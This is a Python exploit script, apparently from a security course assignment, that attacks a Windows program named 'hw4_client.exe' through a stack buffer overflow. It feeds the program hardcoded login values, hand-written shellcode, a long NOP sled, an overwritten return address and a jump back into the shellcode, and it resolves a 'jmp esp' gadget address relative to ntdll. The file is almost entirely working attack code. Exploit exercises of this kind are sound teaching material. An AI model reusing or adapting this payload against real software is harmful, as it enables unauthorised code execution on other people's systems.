import ctypes
import subprocess
from ctypes import wintypes


address_of_jump_esp_gaddget = 0x4b31eb7a

def GetModuleHandle(module):
    kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
    kernel32.GetModuleHandleW.restype = wintypes.HMODULE
    kernel32.GetModuleHandleW.argtypes = [wintypes.LPCWSTR]
    hMod = kernel32.GetModuleHandleW(module)
    return hMod 

ntdll_base = GetModuleHandle("ntdll")
offset_from_base = address_of_jump_esp_gaddget - ntdll_base

exe_path = "hw4_client.exe"

# Start the process
process = subprocess.Popen(exe_path, stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=False)
input()

address_of_socket = "\x5F\xFD\x90"
address_of_shellCode = "\x5F\xDC\xE8"

first_input = b"archer\n56M9JNQ60KB7APLC\nPEEK\n"
shellCode = b"\x68\x50\x45\x45\x4B\x89\xE0\xBB\x2F\xA5\xA0\xFF\xF7\xD3\x53\x50\xB8\xBD\x19\x50\x62\xFF\xD0\x58\x58\x58\xB8\xFF\xFF\xFF\xFF\xF7\xD0\x50\xB8\x7F\x7F\xAF\x9D\xF7\xD0\x50\xB8\x2F\xE5\xA0\xFF\xF7\xD0\x50\x6A\x07\xB8\x6F\x02\xA0\xFF\xF7\xD0\xFF\x30\xB8\x92\x18\x50\x62\xFF\xD0\x58\x58\x58\x58\x58\xB8\x17\x23\xA0\xFF\xF7\xD0\xFF\xE0" + b"\x90" * 0X2046
new_ret_address = b"( Pb"
jump_to_shellCode = b"\xE9\x5F\xDF\xFF\xFF"

payload = first_input + shellCode + new_ret_address + jump_to_shellCode 

output, error = process.communicate(input = payload)